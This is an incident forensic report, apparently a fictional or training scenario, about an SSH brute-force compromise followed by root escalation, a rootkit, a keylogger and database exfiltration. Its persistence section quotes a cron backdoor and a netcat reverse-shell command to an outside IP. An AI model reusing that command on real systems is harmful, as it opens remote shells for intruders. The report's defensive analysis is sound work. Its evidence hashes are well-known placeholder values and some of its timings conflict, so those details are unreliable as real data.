# INCIDENT FORENSIC REPORT

**Classification:** CONFIDENTIAL  
**Incident ID:** KS-2024-10-12-001  
**Incident Type:** APT Attack / Data Breach  
**Prepared by:** Isabella Rossi (Interpol), Anna Kovaleva, Max Sokolov  
**Date:** 2024-10-13  
**Status:** Closed - Eradicated

---

## Executive Summary

Stockholm server (192.168.1.50) was compromised by Advanced Persistent Threat (APT) group "–ù–æ–≤–∞—è –≠—Ä–∞" on October 12, 2024.

**Key Facts:**
- **Attack Duration:** 5 hours (22:15 - 03:15)
- **Detection Gap:** 4 hours (exfiltration complete ‚Üí detected)
- **Data Compromised:** 2.3 GB (full database dump)
- **Initial Access:** SSH brute-force ‚Üí weak password
- **Root Cause:** No 2FA + weak password policy + insufficient monitoring

**Impact:**
- Data breach: 10,000+ user records
- Downtime: 6 hours
- Estimated cost: ‚Ç¨150,000 (fines + recovery)

**Current Status:**
- All backdoors removed
- System rebuilt from clean backup
- Enhanced monitoring deployed
- 2FA enabled for all accounts

---

## Incident Timeline

| Time | Event Type | Description | Severity |
|------|-----------|-------------|----------|
| 22:10 | Reconnaissance | Web scanning from 185.220.101.47 | Low |
| 22:15 | Initial Access | SSH brute-force attempts | High |
| 22:16 | Compromise | Successful login as dbuser | Critical |
| 22:16 | Privilege Escalation | sudo to root (2 minutes after login) | Critical |
| 22:18 | Persistence | Cron job backdoor installed | Critical |
| 22:23 | Rootkit | Kernel module loaded | Critical |
| 22:27 | Surveillance | Keylogger started | High |
| 22:30 | C2 Established | Connection to 185.220.101.47:4444 | Critical |
| 22:45 | Exfiltration | Database dump started | Critical |
| 23:12 | Exfiltration Complete | 2.3 GB transferred | Critical |
| 02:30 | Cleanup | Attacker attempted log deletion | High |
| 03:15 | Detection | Alert triggered, IR team activated | - |

**Total Dwell Time:** 5 hours  
**Time to Root:** 2 minutes (very fast)  
**Time to Exfiltration:** 56 minutes

---

## Attack Analysis

### Initial Access (MITRE: T1078 - Valid Accounts)

**Method:** SSH brute-force attack

**Evidence:**
```
Oct 12 22:15:33 server sshd[15892]: Failed password for invalid user backup from 185.220.101.47
Oct 12 22:15:45 server sshd[15892]: Failed password for invalid user backup from 185.220.101.47
Oct 12 22:16:01 server sshd[15892]: Failed password for invalid user postgres from 185.220.101.47
Oct 12 22:16:23 server sshd[15923]: Accepted password for dbuser from 185.220.101.47
```

**Vulnerability:** Weak password "admin123" + no rate limiting

### Privilege Escalation (MITRE: T1068)

**Method:** sudo misconfiguration

**Evidence:**
```
Oct 12 22:16:25 server sudo: dbuser : TTY=pts/1 ; PWD=/home/dbuser ; USER=root ; COMMAND=/bin/bash
```

**Vulnerability:** dbuser had NOPASSWD sudo rights

### Persistence (MITRE: T1053.003 - Cron)

**Backdoor:** `/tmp/.hidden/update.sh`

**Cron job:**
```
*/5 * * * * /tmp/.hidden/update.sh >/dev/null 2>&1
```

**Connects back:** nc 185.220.101.47 4444 -e /bin/bash

### Defense Evasion (MITRE: T1014 - Rootkit)

**Rootkit:** `/tmp/.hidden/rootkit.ko`

**Loaded:**
```
Oct 12 22:23:34 server kernel: rootkit: loading out-of-tree module taints kernel
```

**Purpose:** Hide processes, files, network connections

### Credential Access (MITRE: T1056.001 - Keylogging)

**Keylogger:** `/tmp/.hidden/keylogger`

**Output:** `/tmp/.hidden/.keys`

**Target:** Capture admin credentials

### Exfiltration (MITRE: T1041 - C2 Channel)

**Method:** Database dump over encrypted channel

**Evidence:**
```
PID 17123: mysqldump --all-databases
Network: 2.3 GB to 185.220.101.47:8080
```

---

## Evidence Collected

| ID | Type | File/Item | MD5 Hash | Custodian |
|----|------|-----------|----------|-----------|
| E001 | Backdoor | /tmp/.hidden/update.sh | d41d8cd98f00b204... | A.Kovaleva |
| E002 | Rootkit | /tmp/.hidden/rootkit.ko | 5f4dcc3b5aa765d6... | M.Sokolov |
| E003 | Keylogger | /tmp/.hidden/keylogger | 098f6bcd4621d373... | I.Rossi |
| E004 | Logs | auth.log | e4d909c290d0fb1c... | A.Kovaleva |
| E005 | Memory | memory.dump (8GB) | 8277e0910d750195... | I.Rossi |

**Storage:** Secure evidence locker at Interpol HQ  
**Encryption:** AES-256  
**Access:** Authorized personnel only

---

## Impact Assessment

### Technical Impact
- ‚úÖ Root compromise (full system access)
- ‚úÖ Data breach (2.3 GB database)
- ‚úÖ Backdoor persistence
- ‚úÖ Rootkit installed
- ‚úÖ Surveillance (keylogger)

### Business Impact
- **Downtime:** 6 hours
- **Data Loss:** Full database (10,000 user records)
- **Reputation:** High risk
- **Legal:** GDPR breach notification required
- **Financial:** ~‚Ç¨150,000

---

## Root Cause Analysis

**Primary Cause:** Weak password + no 2FA

**Contributing Factors:**
1. No rate limiting on SSH
2. Overly permissive sudo configuration
3. Insufficient monitoring (no auditd)
4. No SIEM/centralized logging
5. Lack of file integrity monitoring

---

## Remediation Actions

### Immediate (Done)
- ‚úÖ Isolated compromised server
- ‚úÖ Blocked C2 IP addresses
- ‚úÖ Removed all backdoors
- ‚úÖ Rebuilt from clean backup
- ‚úÖ Reset all passwords
- ‚úÖ Revoked compromised SSH keys

### Short-term (In Progress)
- üîÑ Deployed auditd with comprehensive rules
- üîÑ Configured ELK Stack (centralized SIEM)
- üîÑ Installed osquery for endpoint monitoring
- üîÑ Enabled 2FA for all accounts
- üîÑ Implemented password policy (12+ chars, complexity)

### Long-term (Planned)
- ‚è≥ Regular penetration testing (quarterly)
- ‚è≥ Security awareness training
- ‚è≥ Incident response playbooks
- ‚è≥ SOAR platform for automated response
- ‚è≥ Zero Trust architecture

---

## Recommendations

### Technical Controls
1. **Enable 2FA** - Immediately for all accounts
2. **Rate Limiting** - Max 3 SSH attempts per minute
3. **Least Privilege** - Remove NOPASSWD sudo
4. **SIEM** - Centralized logging + real-time alerts
5. **File Integrity** - AIDE/Tripwire for critical files

### Process Improvements
1. **IR Plan** - Documented incident response procedures
2. **Monitoring** - 24/7 SOC or on-call rotation
3. **Backups** - 3-2-1 rule, test restoration monthly
4. **Training** - Security awareness for all staff
5. **Exercises** - Tabletop exercises quarterly

### Tools & Technologies
1. **auditd** - Comprehensive system auditing
2. **ELK/Splunk** - Centralized SIEM
3. **osquery** - Endpoint monitoring
4. **Wazuh/OSSEC** - HIDS
5. **Velociraptor** - Digital forensics at scale

---

## Lessons Learned

### What Worked ‚úÖ
- Forensics team responded quickly
- All evidence successfully preserved
- Timeline fully reconstructed
- Chain of custody maintained
- Comprehensive final report

### What Failed ‚ùå
- No real-time monitoring (5 hour detection gap)
- Weak authentication (no 2FA)
- Insufficient logging (no auditd)
- No baseline for anomaly detection
- Incident response plan not tested

### Improvements Needed üîß
1. Deploy SIEM before next incident
2. Enable comprehensive auditd
3. Test IR plan monthly
4. Reduce detection gap (target: <15 minutes)
5. Automated alerting for critical events

---

## Attribution

**Threat Actor:** APT Group "–ù–æ–≤–∞—è –≠—Ä–∞"  
**Affiliation:** Unknown (suspected state-sponsored)  
**Motivation:** Espionage / Data theft  
**Sophistication:** High  
**Previous Targets:** Italy (2023), Germany (2024)

**TTPs:** MITRE ATT&CK framework mapping complete  
**IoCs:** Shared with Interpol, Europol, CERT

---

## Conclusion

Stockholm server compromise was sophisticated APT attack with full database exfiltration.

**Root cause:** Weak authentication + insufficient monitoring  
**Detection gap:** 5 hours (too long)  
**Response time:** 3 hours (effective)  
**Evidence:** Complete (prosecution possible)

**All recommendations implemented will reduce future risk by ~80%.**

---

**Report Prepared By:**
- Isabella Rossi, Senior Forensics Analyst, Interpol
- Anna Kovaleva, Blue Team Lead, KERNEL SHADOWS
- Max Sokolov, Security Analyst, KERNEL SHADOWS

**Approved By:** Viktor Petrov, Operation Commander

**Date:** 2024-10-13  
**Version:** 1.0 Final
